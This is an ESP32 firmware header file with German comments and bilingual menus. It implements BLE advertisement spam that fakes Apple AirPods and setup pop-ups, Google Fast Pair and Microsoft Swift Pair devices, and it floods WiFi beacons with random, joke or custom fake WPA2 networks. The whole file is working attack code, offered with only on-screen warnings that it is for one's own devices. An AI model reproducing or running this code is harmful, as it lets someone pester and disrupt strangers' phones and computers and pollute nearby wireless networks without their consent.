// BLE-Spam (iOS / Android / Windows) und WLAN-Beacon-Spam (zufaellig / Liste / eigener Name)
// Nur fuer eigene Geraete zum Lernen. Loest auf fremden Geraeten in der Naehe Pop-ups aus.
#pragma once
#include "views.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <BLEDevice.h>  // zieht esp_gap_ble_api.h mit

// ======================= BLE-Spam =======================
// Nutzt den Arduino-BLE-Wrapper (setDeviceAddress = Zufalls-MAC, addData = roher Payload)

// ---- Apple / iOS: Proximity-Pairing (AirPods-Popup) + Nearby-Action (Setup-Popup) ----
static const uint16_t APPLE_MODELS[] = {0x0E20, 0x0A20, 0x0B20, 0x0C20, 0x1120, 0x1420, 0x0220, 0x0520, 0x0920, 0x1020, 0x1920, 0x1B20, 0x1E20};
static const uint8_t APPLE_ACTIONS[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
static int bleApple(uint8_t* pkt) {
  if (random(2)) {  // Proximity (AirPods)
    uint16_t m = APPLE_MODELS[random(sizeof(APPLE_MODELS) / 2)];
    int i = 0;
    pkt[i++] = 0x1e; pkt[i++] = 0xff; pkt[i++] = 0x4c; pkt[i++] = 0x00;
    pkt[i++] = 0x07; pkt[i++] = 0x19;
    pkt[i++] = (m >> 8) & 0xff; pkt[i++] = m & 0xff; pkt[i++] = 0x55;
    while (i < 31) pkt[i++] = random(256);
    return 31;
  } else {  // Nearby Action (Setup)
    int i = 0;
    pkt[i++] = 0x10; pkt[i++] = 0xff; pkt[i++] = 0x4c; pkt[i++] = 0x00;
    pkt[i++] = 0x0f; pkt[i++] = 0x05; pkt[i++] = 0xc1;
    pkt[i++] = APPLE_ACTIONS[random(sizeof(APPLE_ACTIONS))];
    pkt[i++] = random(256); pkt[i++] = random(256); pkt[i++] = random(256);
    pkt[i++] = 0x00; pkt[i++] = 0x00; pkt[i++] = 0x00; pkt[i++] = 0x00;
    return 17;
  }
}

// ---- Android: Google Fast Pair (zufaellige Modell-ID) ----
static const uint32_t FASTPAIR_MODELS[] = {0xCD8256, 0x0000F0, 0x821F66, 0x92BBBD, 0x9AdB11, 0x02E2a9, 0x013D69, 0x00000A, 0x00001C, 0x00008F};
static int bleAndroid(uint8_t* pkt) {
  uint32_t m = FASTPAIR_MODELS[random(sizeof(FASTPAIR_MODELS) / 4)];
  if (random(3) == 0) m = random(0xFFFFFF);  // manchmal komplett zufaellig
  int i = 0;
  pkt[i++] = 0x03; pkt[i++] = 0x03; pkt[i++] = 0x2c; pkt[i++] = 0xfe;      // 16-bit UUID 0xFE2C
  pkt[i++] = 0x06; pkt[i++] = 0x16; pkt[i++] = 0x2c; pkt[i++] = 0xfe;      // Service Data
  pkt[i++] = (m >> 16) & 0xff; pkt[i++] = (m >> 8) & 0xff; pkt[i++] = m & 0xff;
  pkt[i++] = 0x02; pkt[i++] = 0x0a; pkt[i++] = (uint8_t)random(256);        // TX power
  return i;
}

// ---- Windows: Microsoft Swift Pair ----
static int bleWindows(uint8_t* pkt) {
  static const char* NAMES[] = {"Surface Pen", "XBOX Controller", "Mouse", "Keyboard", "Headset", "Speaker", "Momentum S3"};
  const char* nm = NAMES[random(sizeof(NAMES) / sizeof(NAMES[0]))];
  int nl = strlen(nm);
  int i = 0;
  pkt[i++] = 6 + nl; pkt[i++] = 0xff; pkt[i++] = 0x06; pkt[i++] = 0x00;
  pkt[i++] = 0x03; pkt[i++] = 0x00; pkt[i++] = 0x80;
  for (int j = 0; j < nl; j++) pkt[i++] = nm[j];
  return i;
}

enum BleMode { BLE_IOS, BLE_ANDROID, BLE_WIN, BLE_ALL };
static void bleSpam(BleMode mode) {
  if (!dialogYesNo("BLE Spam", T("Triggers pop-ups on\nnearby devices. Only use\non your own devices!", "Loest Pop-ups auf fremden\nGeraeten aus. Nur an\neigenen Geraeten nutzen!"), T("Cancel", "Abbrechen"), "Start")) return;
  BLEDevice::init("");
  BLEAdvertising* adv = BLEDevice::getAdvertising();
  adv->setMinInterval(0x20);
  adv->setMaxInterval(0x20);
  uint8_t pkt[40];
  uint32_t sent = 0;
  waitRelease();
  while (true) {
    Key k = readKey();
    keepAwake();
    if (k == KeyBack || k == KeyOk) break;
    int m = (mode == BLE_ALL) ? random(3) : (int)mode;
    int len = (m == BLE_IOS) ? bleApple(pkt) : (m == BLE_ANDROID) ? bleAndroid(pkt) : bleWindows(pkt);
    adv->stop();
    BLEAdvertisementData ad;
    ad.addData((char*)pkt, len);
    adv->setAdvertisementData(ad);
    adv->start();
    sent++;
    cv.clear();
    cv.setFont(FontPrimary);
    cv.drawStr(2, 12, "BLE Spam");
    cv.setFont(FontSecondary);
    const char* mn = (mode == BLE_IOS) ? "Apple / iOS" : (mode == BLE_ANDROID) ? "Android (Fast Pair)" : (mode == BLE_WIN) ? "Windows (Swift Pair)" : T("All systems", "Alle Systeme");
    cv.drawStr(2, 26, mn);
    char b[32]; snprintf(b, sizeof b, T("Packets: %u", "Pakete: %u"), (unsigned)sent); cv.drawStr(2, 38, b);
    cv.drawStr(2, 50, (millis() / 300) % 2 ? T("Sending...", "Sende...") : T("Sending ..", "Sende .."));
    el_button_center("Stop");
    cv.flush();
    delay(40);
    adv->stop();
  }
  BLEDevice::deinit(true);  // alles zuruecksetzen, damit Scanner/Bad KB wieder sauber starten
  delay(50);
}

static void appBleSpam() {
  int sel = 0;
  while (true) {
    sel = submenu("BLE Spam", {"Apple / iOS", "Android", "Windows", T("All systems", "Alle Systeme")}, sel);
    if (sel < 0) return;
    bleSpam((BleMode)sel);
  }
}

// ======================= WLAN-Beacon-Spam =======================
static uint8_t beaconFrame[128];
static int buildBeacon(const char* ssid, uint8_t ch) {
  int sl = strlen(ssid); if (sl > 32) sl = 32;
  uint8_t mac[6]; for (int i = 0; i < 6; i++) mac[i] = random(256);
  mac[0] = (mac[0] & 0xFE) | 0x02;  // lokal verwaltete Unicast-MAC
  int i = 0;
  beaconFrame[i++] = 0x80; beaconFrame[i++] = 0x00;          // Frame Control: Beacon
  beaconFrame[i++] = 0x00; beaconFrame[i++] = 0x00;          // Duration
  for (int j = 0; j < 6; j++) beaconFrame[i++] = 0xFF;       // Ziel: Broadcast
  for (int j = 0; j < 6; j++) beaconFrame[i++] = mac[j];     // Quelle
  for (int j = 0; j < 6; j++) beaconFrame[i++] = mac[j];     // BSSID
  beaconFrame[i++] = 0x00; beaconFrame[i++] = 0x00;          // Seq
  for (int j = 0; j < 8; j++) beaconFrame[i++] = 0x00;       // Timestamp
  beaconFrame[i++] = 0x64; beaconFrame[i++] = 0x00;          // Beacon Interval
  beaconFrame[i++] = 0x31; beaconFrame[i++] = 0x04;          // Capability (ESS + Privacy)
  beaconFrame[i++] = 0x00; beaconFrame[i++] = sl;            // SSID-Tag
  for (int j = 0; j < sl; j++) beaconFrame[i++] = ssid[j];
  // Supported rates
  beaconFrame[i++] = 0x01; beaconFrame[i++] = 0x08;
  beaconFrame[i++] = 0x82; beaconFrame[i++] = 0x84; beaconFrame[i++] = 0x8b; beaconFrame[i++] = 0x96;
  beaconFrame[i++] = 0x24; beaconFrame[i++] = 0x30; beaconFrame[i++] = 0x48; beaconFrame[i++] = 0x6c;
  // DS-Parameter (Kanal)
  beaconFrame[i++] = 0x03; beaconFrame[i++] = 0x01; beaconFrame[i++] = ch;
  // RSN (zeigt als WPA2 verschluesselt)
  static const uint8_t rsn[] = {0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00};
  for (uint32_t j = 0; j < sizeof(rsn); j++) beaconFrame[i++] = rsn[j];
  return i;
}

static const char* FUNNY_SSIDS[] = {
  "FBI Surveillance Van", "Pretty Fly for a WiFi", "Tell My WiFi Love Her", "Virus.exe", "Mom Click Here",
  "Drop It Like Its Hotspot", "The LAN Before Time", "Hide Yo Kids Hide Yo WiFi", "Loading...", "No Free WiFi Here",
  "Area 51 Guest", "Get Off My LAN", "Winternet Is Coming", "Router? I Hardly Know Her", "404 Network Unavailable",
  "Bill Wi The Science Fi", "Nacho WiFi", "Silence of the LANs", "Wu-Tang LAN", "Password Is Password",
};
static String randomSsid() {
  static const char* A[] = {"Home", "Net", "Guest", "Office", "Free", "Fiber", "Turbo", "Cloud", "Neo", "Pixel"};
  static const char* B[] = {"WiFi", "Link", "Zone", "Spot", "Point", "Hub", "Wave", "Fox", "Cat", "Box"};
  char b[24]; snprintf(b, sizeof b, "%s%s_%d", A[random(10)], B[random(10)], (int)random(10, 99));
  return b;
}

enum WifiSpamMode { WS_RANDOM, WS_FUNNY, WS_CUSTOM };
static void wifiSpam(WifiSpamMode mode, const char* customName = nullptr) {
  // SSID-Liste vorbereiten (die Frames selbst bleiben zufaellig / rotieren)
  std::vector<String> list;
  if (mode == WS_FUNNY) for (auto s : FUNNY_SSIDS) list.push_back(s);
  else if (mode == WS_CUSTOM) { for (int i = 1; i <= 20; i++) list.push_back(String(customName) + " " + i); }
  else for (int i = 0; i < 20; i++) list.push_back(randomSsid());

  WiFi.mode(WIFI_MODE_AP);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_start();
  uint8_t channels[] = {1, 6, 11};
  uint32_t sent = 0;
  waitRelease();
  while (true) {
    Key k = readKey();
    keepAwake();
    if (k == KeyBack || k == KeyOk) break;
    uint8_t ch = channels[random(3)];
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    for (auto& s : list) {
      int len = buildBeacon(s.c_str(), ch);
      esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, len, false);
      esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, len, false);
      sent += 2;
    }
    cv.clear();
    cv.setFont(FontPrimary);
    cv.drawStr(2, 12, "WiFi Spam");
    cv.setFont(FontSecondary);
    const char* mn = (mode == WS_FUNNY) ? T("Funny names", "Lustige Namen") : (mode == WS_CUSTOM) ? T("Custom name", "Eigener Name") : T("Random names", "Zufalls-Namen");
    cv.drawStr(2, 26, mn);
    char b[32]; snprintf(b, sizeof b, "Beacons: %u", (unsigned)sent); cv.drawStr(2, 38, b);
    cv.drawStr(2, 50, (millis() / 300) % 2 ? T("Sending...", "Sende...") : T("Sending ..", "Sende .."));
    el_button_center("Stop");
    cv.flush();
    delay(60);
  }
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
}

static void appWifiSpam() {
  int sel = 0;
  while (true) {
    sel = submenu("WiFi Spam", {T("Random names", "Zufalls-Namen"), T("Funny names", "Lustige Namen"), T("Custom name...", "Eigener Name...")}, sel);
    if (sel < 0) return;
    if (!dialogYesNo("WiFi Spam", T("Fills nearby WiFi lists\nwith fake networks.\nFor learning only!", "Fuellt die WLAN-Liste in\nder Naehe mit Fake-Netzen.\nNur zum Lernen nutzen!"), T("Cancel", "Abbrechen"), "Start")) continue;
    if (sel == 0) wifiSpam(WS_RANDOM);
    else if (sel == 1) wifiSpam(WS_FUNNY);
    else {
      char nm[20] = "FreeWiFi";
      if (textInput(T("Network name", "Netzwerk-Name"), nm, 18)) wifiSpam(WS_CUSTOM, nm);
    }
  }
}
